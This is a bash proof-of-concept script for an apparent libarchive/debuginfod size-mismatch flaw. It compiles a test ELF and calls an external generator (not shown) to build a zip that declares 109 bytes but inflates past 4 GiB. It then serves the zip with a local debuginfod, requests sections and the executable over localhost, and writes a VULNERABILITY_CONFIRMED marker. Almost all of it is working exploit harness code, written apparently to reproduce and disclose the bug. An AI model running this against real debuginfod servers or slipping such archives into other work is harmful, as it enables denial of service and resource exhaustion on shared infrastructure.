set -euo pipefail

ROOT=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
WORK_DIR="$ROOT/run"
PORT=18002
LIBARCHIVE_DIR=""
FULL_CACHE=0
KEEP_SERVER=0
METHOD=stored-sparse

while [ "$#" -gt 0 ]; do
    case "$1" in
        --work-dir)
            WORK_DIR="$2"
            shift 2
            ;;
        --port)
            PORT="$2"
            shift 2
            ;;
        --libarchive-dir)
            LIBARCHIVE_DIR="$2"
            shift 2
            ;;
        --full-cache-response)
            FULL_CACHE=1
            shift
            ;;
        --compact-deflate)
            METHOD=deflate
            shift
            ;;
        --keep-server)
            KEEP_SERVER=1
            shift
            ;;
        *)
            echo "unknown argument: $1" >&2
            exit 2
            ;;
    esac
done

need() {
    command -v "$1" >/dev/null 2>&1 || {
        echo "missing command: $1" >&2
        exit 1
    }
}

need python3
need gcc
need readelf
need bsdtar
need bsdunzip
need debuginfod
need curl

if [ -n "$LIBARCHIVE_DIR" ]; then
    export LD_LIBRARY_PATH="$LIBARCHIVE_DIR${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
fi

rm -rf "$WORK_DIR"
mkdir -p "$WORK_DIR/src" "$WORK_DIR/archive-root" "$WORK_DIR/logs" "$WORK_DIR/client-cache"

cat > "$WORK_DIR/src/poc.c" <<'EOF'
#include <stdio.h>
__attribute__((section(".poc_marker"), used))
const char poc_marker[] = "LIBARCHIVE_DEBuginfod_BOUNDARY_MARKER_v1";
const char marker[] = "libarchive-debuginfod-size-boundary";
int main(void) {
    puts(marker);
    return 0;
}
EOF

gcc -g -Wl,--build-id=sha1 -o "$WORK_DIR/poc.elf" "$WORK_DIR/src/poc.c"
BUILD_ID=$(readelf -n "$WORK_DIR/poc.elf" | awk '/Build ID:/ {print $3; exit}')
if [ -z "$BUILD_ID" ]; then
    echo "failed to read build-id" >&2
    exit 1
fi

NOTE_OFFSET_HEX=$(readelf -S -W "$WORK_DIR/poc.elf" | awk '{for (i = 1; i <= NF; i++) if ($i == ".note.gnu.build-id") {print $(i + 3); exit}}')
NOTE_OFFSET=$((16#$NOTE_OFFSET_HEX))

python3 "$ROOT/make_debuginfod_zip.py" --method "$METHOD" --elf "$WORK_DIR/poc.elf" --out "$WORK_DIR/archive-root/debuginfod_declared_109_actual_4g_plus_109.zip" > "$WORK_DIR/logs/generator.log"

ZIP="$WORK_DIR/archive-root/debuginfod_declared_109_actual_4g_plus_109.zip"
bsdtar -tvf "$ZIP" > "$WORK_DIR/logs/bsdtar_list.txt"
bsdunzip -l "$ZIP" > "$WORK_DIR/logs/bsdunzip_list.txt"
bsdunzip -t "$ZIP" > "$WORK_DIR/logs/bsdunzip_test.txt"

export DEBUGINFOD_CACHE_PATH="$WORK_DIR/client-cache"
LOG="$WORK_DIR/logs/debuginfod.log"
DB="$WORK_DIR/debuginfod.sqlite"
debuginfod -v -v -v -Z .zip=cat -d "$DB" -p "$PORT" -t 0 -g 0 -c 1 --fdcache-mbs=8192 --fdcache-fds=64 "$WORK_DIR/archive-root" > "$LOG" 2>&1 &
SERVER_PID=$!

cleanup() {
    if [ "$KEEP_SERVER" -eq 0 ] && kill -0 "$SERVER_PID" >/dev/null 2>&1; then
        kill "$SERVER_PID" >/dev/null 2>&1 || true
        wait "$SERVER_PID" >/dev/null 2>&1 || true
    fi
}
trap cleanup EXIT

for _ in $(seq 1 120); do
    if curl -fsS -D "$WORK_DIR/logs/section.headers" -o "$WORK_DIR/section.bin" "http://127.0.0.1:$PORT/buildid/$BUILD_ID/section/.note.gnu.build-id" >/dev/null 2>&1; then
        break
    fi
    sleep 1
done

if [ ! -s "$WORK_DIR/section.bin" ]; then
    echo "debuginfod failed to return the build-id section" >&2
    tail -80 "$LOG" >&2 || true
    exit 1
fi

curl -fsS -D "$WORK_DIR/logs/marker_section.headers" -o "$WORK_DIR/marker_section.bin" "http://127.0.0.1:$PORT/buildid/$BUILD_ID/section/.poc_marker" >/dev/null

python3 - "$WORK_DIR/section.bin" "$BUILD_ID" > "$WORK_DIR/logs/section_check.txt" <<'PY'
import pathlib
import sys
data = pathlib.Path(sys.argv[1]).read_bytes()
needle = bytes.fromhex(sys.argv[2])
print(f"section_size={len(data)}")
present = data.find(needle) >= 0
print(f"build_id_present={str(present).lower()}")
if present == False:
    raise SystemExit(1)
PY

python3 - "$WORK_DIR/marker_section.bin" "$WORK_DIR/VULNERABILITY_CONFIRMED.marker" "$BUILD_ID" > "$WORK_DIR/logs/marker_check.txt" <<'PY'
import pathlib
import sys
data = pathlib.Path(sys.argv[1]).read_bytes()
marker = b"LIBARCHIVE_DEBuginfod_BOUNDARY_MARKER_v1"
present = data.find(marker) >= 0
print(f"marker_size={len(data)}")
print(f"marker_present={str(present).lower()}")
if present == False:
    raise SystemExit(1)
pathlib.Path(sys.argv[2]).write_text(
    "confirmed=true\n"
    "source=debuginfod_section_.poc_marker\n"
    f"build_id={sys.argv[3]}\n"
    f"marker={marker.decode()}\n",
    encoding="utf-8",
)
PY

curl -fsS -D "$WORK_DIR/logs/executable_first.headers" -o "$WORK_DIR/executable_first.bin" "http://127.0.0.1:$PORT/buildid/$BUILD_ID/executable" >/dev/null

if [ "$FULL_CACHE" -eq 1 ]; then
    curl -fsS -D "$WORK_DIR/logs/executable_second.headers" -o /dev/null "http://127.0.0.1:$PORT/buildid/$BUILD_ID/executable" >/dev/null
fi

echo "build_id=$BUILD_ID"
echo "declared_size=109"
echo "actual_inflated_size=$((4294967296 + 109))"
echo "note_offset=$NOTE_OFFSET"
echo "note_offset_past_declared=$([ "$NOTE_OFFSET" -gt 109 ] && echo true || echo false)"
awk '/debuginfod_declared_109_actual_4g_plus_109.zip/ {print "bsdtar_list="$0}' "$WORK_DIR/logs/bsdtar_list.txt"
awk '/poc-hidden-debug-file/ {print "bsdunzip_list="$0}' "$WORK_DIR/logs/bsdunzip_list.txt"
awk '/testing:/ || /OK/ {print "bsdunzip_test="$0}' "$WORK_DIR/logs/bsdunzip_test.txt"
cat "$WORK_DIR/logs/section_check.txt"
cat "$WORK_DIR/logs/marker_check.txt"
awk 'BEGIN{IGNORECASE=1} $0 ~ "^HTTP/" {print "section_http="$0} $0 ~ "^Content-Length:" {print "section_"$0} $0 ~ "^X-DEBUGINFOD-SIZE:" {print "section_"$0}' "$WORK_DIR/logs/section.headers"
awk 'BEGIN{IGNORECASE=1} $0 ~ "^HTTP/" {print "marker_section_http="$0} $0 ~ "^Content-Length:" {print "marker_section_"$0} $0 ~ "^X-DEBUGINFOD-SIZE:" {print "marker_section_"$0}' "$WORK_DIR/logs/marker_section.headers"
awk 'BEGIN{IGNORECASE=1} $0 ~ "^HTTP/" {print "first_executable_http="$0} $0 ~ "^Content-Length:" {print "first_executable_"$0} $0 ~ "^X-DEBUGINFOD-SIZE:" {print "first_executable_"$0}' "$WORK_DIR/logs/executable_first.headers"
if [ "$FULL_CACHE" -eq 1 ]; then
    awk 'BEGIN{IGNORECASE=1} $0 ~ "^HTTP/" {print "second_executable_http="$0} $0 ~ "^Content-Length:" {print "second_executable_"$0} $0 ~ "^X-DEBUGINFOD-SIZE:" {print "second_executable_"$0}' "$WORK_DIR/logs/executable_second.headers"
fi
echo "marker_file=$WORK_DIR/VULNERABILITY_CONFIRMED.marker"
echo "work_dir=$WORK_DIR"
